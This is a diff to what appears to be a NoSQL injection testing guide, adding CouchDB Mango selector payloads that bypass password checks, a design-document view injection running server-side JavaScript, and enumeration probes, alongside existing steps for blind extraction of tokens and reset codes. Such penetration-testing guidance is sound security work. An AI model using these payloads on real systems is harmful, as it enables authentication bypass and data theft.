@@ -159,6 +159,21 @@ username: 'x' OR token(username) > token('a') ALLOW FILTERING --
 
 No `SLEEP` or OOB primitive natively — detection is boolean/error-based only.
 
+### CouchDB Mango and View Injection
+
+Mango selectors on `_find` accept operator payloads in the same shape as MongoDB:
+```json
+POST /db/_find  { "selector": {"username": "admin", "password": {"$gt": ""}} }
+POST /db/_find  { "selector": {"role": {"$regex": "^admin"}} }
+```
+
+`_design` document injection — if user input flows into a design doc's `views.<name>.map`, the JavaScript runs server-side in the Couch sandbox on every view query:
+```json
+{"views": {"x": {"map": "function(doc){ emit(doc._id, doc) }"}}}
+```
+
+Also probe `_all_docs?include_docs=true` for unscoped enumeration and check for admin-party misconfigurations (`_users/_all_docs` reachable without auth) before payload work.
+
 ### Neo4j Cypher Injection
 
 When user input is concatenated into Cypher rather than passed as a parameter (`$param`):
@@ -232,7 +247,7 @@ DoS surface (use only with explicit authorization scope):
 6. **Extract data blindly** — character-by-character `$regex` on sensitive fields (token, reset code)
 7. **Test `$where`** — if older MongoDB version detected, attempt JavaScript sleep-based timing
 8. **Probe aggregation endpoints** — inject operators into `filter`/`match`/`sort` fields
-9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL, Neo4j Cypher concatenation, Cassandra CQL
+9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL, CouchDB Mango selectors, Neo4j Cypher concatenation, Cassandra CQL
 10. **Test GraphQL resolvers** — submit operator objects via variables on any input type that reaches a NoSQL filter; use `__schema` introspection to enumerate candidates
 
 ## Validation
